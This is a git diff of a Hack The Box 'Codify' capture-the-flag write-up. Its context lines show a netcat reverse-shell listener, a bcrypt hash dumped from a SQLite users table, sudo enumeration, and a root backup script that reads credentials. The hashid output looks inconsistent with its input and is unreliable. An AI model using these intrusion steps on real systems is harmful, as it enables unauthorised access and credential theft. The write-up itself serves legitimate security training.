@@ -2,7 +2,7 @@
 title: Hack the box - Codify pwned!
 date: 2024-02-24 00:00:01 +0000
 categories: [hack the box, machine]
-tags: [hack the box, machine, codify, vm2 library, sqlite, posix variable quotes]
+tags: [hack the box, codify, vm2 library, sqlite, posix variable quotes]
 img_path: /assets/img/posts/
 ---
 
@@ -40,7 +40,7 @@ If we look for more information about the services running in those ports we wil
 ```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
 |_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
 80/tcp open  http    Apache httpd 2.4.52
@@ -87,7 +87,7 @@ We start a listener in our host:
 
 ```
 nc -lvnp 1234
-``` 
+```
 
 And, we inject the reverse shell in the editor:
 
@@ -99,7 +99,7 @@ And, we inject the reverse shell in the editor:
 Now, we get shell as the user `svc`.
 
 ```
-svc@codify:~$ whoami 
+svc@codify:~$ whoami
 svc
 svc@codify:~$ id
 uid=1001(svc) gid=1001(svc) groups=1001(svc)
@@ -112,7 +112,7 @@ Inside the database we will find the hashed password for the user `joshua`:
 
 ```
 sqlite> .tables
-tickets  users  
+tickets  users
 sqlite> select * from users;
 3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
 ```
@@ -120,7 +120,7 @@ sqlite> select * from users;
 We analyze the hash to see what type it is:
 
 ```
-hashid $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2  
+hashid $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
 Analyzing 'a/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
 [+] Cisco Type ba4c0cfe23b95aef6f5df7d0c88d6ce
 ```
@@ -144,7 +144,7 @@ Now, we have a new user and password, and since seems useless on the web, we wil
 And we are in!
 
 ```
-joshua@codify:~$ id 
+joshua@codify:~$ id
 uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
 ```
 
@@ -156,7 +156,7 @@ After taking our flag, we need to escalate privileges, so let's take a look to s
 
 ```
 joshua@codify:~$ sudo -l
-[sudo] password for joshua: 
+[sudo] password for joshua:
 Matching Defaults entries for joshua on codify:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
@@ -167,7 +167,7 @@ User joshua may run the following commands on codify:
 We can execute the `/opt/scripts/mysql-backup.sh` script as root, so let's take a look at the source code:
 
 ```bash
-joshua@codify:~$ cat /opt/scripts/mysql-backup.sh 
+joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
 #!/bin/bash
 DB_USER="root"
 DB_PASS=$(/usr/bin/cat /root/.creds)
